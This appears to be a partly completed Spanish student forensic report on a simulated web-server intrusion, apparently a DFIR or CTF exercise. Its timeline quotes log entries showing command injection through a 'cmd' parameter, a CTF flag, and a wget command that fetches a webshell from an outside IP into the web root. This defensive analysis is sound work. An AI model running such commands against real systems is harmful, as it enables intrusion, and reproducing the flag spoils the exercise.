# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 06
**Fecha:** 2026-10-23
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

| Nombre y apellido | Usuario de GitHub |
|---|---|
| Martín Beccereca | martinbeccereca |
| Belén Benito | belubenito01 |
| Alejo José De Miguel | AlejoDM |
| Tomás Giudici | TomasGiudici |
| Carolina Suppo | carosuppo |

## 0. Declaración de uso de IA

*Pendiente de completar por el grupo.*

## 1. Resumen del incidente

*Pendiente de completar cuando estén los 5 hallazgos (R1–R5).*

## 2. Cadena de custodia

*Verificación completa pendiente (R5). Nota parcial de P1, relacionada con R1:*

Antes de analizar `logs/access.log` se corrió `shasum -a 256 -c evidencia.sha256` desde `caso/`. En el checkout local (Windows) el comando devolvió `FAILED`/`No such file or directory` para los 9 archivos del manifiesto. Esto es un falso positivo del entorno: Git tiene `core.autocrlf=true` y convierte los finales de línea de LF a CRLF al clonar en Windows, lo que deja un `\r` colgando en cada nombre de archivo listado por `evidencia.sha256` y rompe la búsqueda por nombre; no es evidencia de alteración por sí solo. Ver [salida completa del comando](evidencia/salidas/r1-custodia-check.txt).

Como control, se calculó el hash de `logs/access.log` contra el contenido tal como está comiteado en git (`git show HEAD:... | sha256sum`), que no pasa por esa conversión. Ese hash coincide con el registrado en `evidencia.sha256`: el archivo usado para R1 está íntegro. La verificación de los 9 archivos y la identificación del que sí está alterado quedan para la sección de R5.

## 3. Línea de tiempo del ataque

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 05/Sep/2026 02:18:10 | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: primera prueba de ejecución de comandos contra el endpoint. Confirmado por la respuesta `200`. | `logs/access.log:18` |
| 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
| 05/Sep/2026 02:19:02 | La misma IP usa el mismo canal para `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`: consistente con la descarga del webshell documentado en R2, pero su contenido en disco no fue verificado por P1. | `logs/access.log:20` |

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | | |
| IP/puerto C2 | | |
| Archivo malicioso | | |
| Usuario backdoor | | |
| Persistencia | | |

## 5. Alcance del daño

*Pendiente de completar.*

## 6. Contención y erradicación (recomendaciones)

*Pendiente de completar.*

## 7. Preguntas de análisis (P1–P5)
